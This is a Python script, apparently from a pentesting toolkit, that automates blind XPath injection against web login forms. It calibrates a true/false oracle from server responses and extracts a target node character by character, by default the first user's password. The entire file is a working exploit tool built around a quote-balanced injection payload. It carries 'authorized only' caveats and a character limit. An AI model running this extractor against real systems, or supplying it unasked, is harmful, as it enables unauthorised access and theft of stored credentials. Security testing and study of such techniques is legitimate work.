#!/usr/bin/env python3
"""
xpath_blind.py - blind XPath data extraction, char-by-char, via a boolean oracle (authorized only).

Given a TRUE/FALSE oracle (login ok/nok, record present/absent, status/length diff), this reconstructs a node's value with
count()/string-length()/substring(). Same engine as ../../LDAP/ and ../../NoSQLi/, XPath flavor. Payloads inject into one
field and are quote-balanced (XPath 1.0 has no comments):

    <field> = x' or <CONDITION> or 'x'='y      ->  //user[<field>='x' or <CONDITION> or 'x'='y' and <other>='...']
    (and binds tighter than or, so the result is TRUE iff <CONDITION> is TRUE)

It auto-calibrates TRUE vs FALSE from 1=1 / 1=2 probes, discovers length, then extracts each character.

SAFE: extract YOUR OWN record (or a benign marker) to prove the primitive, then STOP - don't dump every user's hash.
Throttle; redact extracted values in reports. Authorized targets only.

Usage:
  # extract the first user's password (default target), success marked by a string in the body:
  python3 xpath_blind.py --url https://t/login --field username --other password=x --true-regex "Welcome" \
      --target "//user[1]/password" --charset alnum
  # auto-calibrated oracle (status/length), form encoding:
  python3 xpath_blind.py --url https://t/login --field username --other password=x --target "//user[1]/password"
"""
import argparse, json, re, sys, urllib.parse, urllib.request, urllib.error

CHARSETS = {
    "hex": "0123456789abcdef",
    "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "lower": "abcdefghijklmnopqrstuvwxyz0123456789",
    "printable": "".join(chr(c) for c in range(33, 127) if chr(c) not in "'\""),
}


def send(url, method, headers, body, timeout):
    req = urllib.request.Request(url, data=body, method=method, headers=dict(headers))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
            return r.status, len(data), data
    except urllib.error.HTTPError as e:
        data = e.read() if hasattr(e, "read") else b""
        return e.code, len(data), data
    except Exception:
        return None, 0, b""


def inject(condition, field, other, url, method, fmt, hdr, timeout):
    payload = f"x' or {condition} or 'x'='y"
    fields = {field: payload}
    if other:
        k, _, v = other.partition("=")
        fields[k] = v
    if method.upper() == "GET":
        u = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(fields)
        return send(u, "GET", hdr, None, timeout)
    if fmt == "json":
        body, ct = json.dumps(fields).encode(), {"Content-Type": "application/json"}
    else:
        body, ct = urllib.parse.urlencode(fields).encode(), {"Content-Type": "application/x-www-form-urlencoded"}
    return send(url, method, {**ct, **hdr}, body, timeout)


class Oracle:
    def __init__(self, tref, fref, true_regex):
        self.tref, self.fref, self.marker = tref, fref, true_regex
        if true_regex:
            self.by = "marker"
        elif tref[0] != fref[0]:
            self.by = "status"
        elif tref[1] != fref[1]:
            self.by = "length"
        else:
            self.by = None

    def is_true(self, resp):
        st, ln, data = resp
        if self.by == "marker":
            return re.search(self.marker, data.decode("utf-8", "replace")) is not None
        if self.by == "status":
            return st == self.tref[0]
        if self.by == "length":
            return abs(ln - self.tref[1]) <= abs(ln - self.fref[1])
        return False


def main():
    ap = argparse.ArgumentParser(description="Blind XPath char-by-char extractor (authorized only).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data-format", choices=["form", "json"], default="form")
    ap.add_argument("--field", required=True, help="field to inject into (e.g. username)")
    ap.add_argument("--other", help="other field as k=v (e.g. password=x)")
    ap.add_argument("--target", default="//user[1]/password", help="XPath node to extract")
    ap.add_argument("--true-regex", help="regex marking a TRUE response (else auto-calibrate by status/length)")
    ap.add_argument("--charset", default="alnum", help="hex|alnum|lower|printable or a literal charset")
    ap.add_argument("--max-len", type=int, default=64)
    ap.add_argument("--max-chars", type=int, default=0, help="stop after N chars (SAFE-PoC)")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--timeout", type=float, default=20.0)
    a = ap.parse_args()
    hdr = dict(h.split(":", 1) for h in a.header) if a.header else {}

    def cond(c):
        return inject(c, a.field, a.other, a.url, a.method, a.data_format, hdr, a.timeout)

    tref = cond("1=1")
    fref = cond("1=2")
    oracle = Oracle(tref[:2] + (None,), fref[:2] + (None,), a.true_regex)
    if oracle.by is None:
        sys.exit("[!] could not calibrate an oracle from 1=1 / 1=2. Provide --true-regex '<marker on match>'.")
    print(f"[i] oracle calibrated by: {oracle.by}  (TRUE~{tref[0]}/{tref[1]}  FALSE~{fref[0]}/{fref[1]})")

    length = None
    for n in range(1, a.max_len + 1):
        if oracle.is_true(cond(f"string-length(({a.target}))={n}")):
            length = n
            break
    print(f"[i] length of {a.target}: {length if length else 'unknown (>%d)' % a.max_len}")

    charset = CHARSETS.get(a.charset, a.charset)
    known = ""
    limit = length or a.max_len
    while len(known) < limit:
        pos = len(known) + 1
        found = None
        for c in charset:
            if c in "'\"":
                continue
            if oracle.is_true(cond(f"substring(({a.target}),{pos},1)={xstr(c)}")):
                found = c
                break
        if found is None:
            print(f"[i] no charset match at position {pos} - stopping.")
            break
        known += found
        print(f"    [{len(known):>3}] {known}")
        if a.max_chars and len(known) >= a.max_chars:
            print(f"[i] reached --max-chars {a.max_chars} (SAFE-PoC: stop once proven).")
            break
    print(f"\n[RESULT] {a.target} = {known!r}   (redact in report)")
    return 0


def xstr(c):
    """XPath string literal for a single char (charset excludes quotes, so simple quoting is safe)."""
    return "'" + c + "'"


if __name__ == "__main__":
    sys.exit(main())
